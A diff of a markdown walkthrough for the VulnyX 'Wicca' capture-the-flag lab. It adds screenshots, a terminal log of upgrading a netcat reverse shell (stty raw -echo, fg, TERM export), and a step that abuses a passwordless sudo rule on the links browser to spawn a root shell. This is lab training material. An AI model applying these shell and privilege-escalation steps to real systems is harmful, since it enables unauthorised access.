@@ -30,7 +30,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 44.83 seconds
 ```
 
+![vulnyx lab port 5000](/walkthroughs/vulnyx/low-difficulty/wicca/vulnyx-lab-web.png)
+
 ### Shell (aleister)
+![test web](/walkthroughs/vulnyx/low-difficulty/wicca/test-web.png)
+
 Reverse shell script
 ```bash
 URL: 
@@ -54,6 +58,29 @@ $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 aleister@wicca:/$ ^Z
 zsh: suspended  nc -lvnp 443
 ```
+```bash
+┌──(dungcngo㉿kali)-[/tmp]
+└─$ stty -a                
+speed 38400 baud; rows 30; columns 84; line = 0;
+intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>;
+eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
+werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff
+-iuclc -ixany -imaxbel iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl
+echoke -flusho -extproc
+                                                                                    
+┌──(dungcngo㉿kali)-[/tmp]
+└─$ stty raw -echo;fg                
+[1]  + continued  nc -lvnp 443
+                              export SHELL=bash
+aleister@wicca:/$ export TERM=xterm-256color
+aleister@wicca:/$ stty rows 30 columns 84
+aleister@wicca:/$ 
+```
+
 ### Privilege Escalation
 #### Enumeration
 ```bash
@@ -66,7 +93,11 @@ Matching Defaults entries for aleister on wicca:
 User aleister may run the following commands on wicca:
     (root) NOPASSWD: /usr/bin/links
 ```
+
 #### Abuse
+Open the link: `sudo /usr/bin/links`, press ESC and in the File menu select the OS shell option.
+![os-shell](/walkthroughs/vulnyx/low-difficulty/wicca/os-shell.png)
+
 ```bash
 aleister@wicca:~$ sudo links
 root@wicca:/home/aleister# id ; hostname
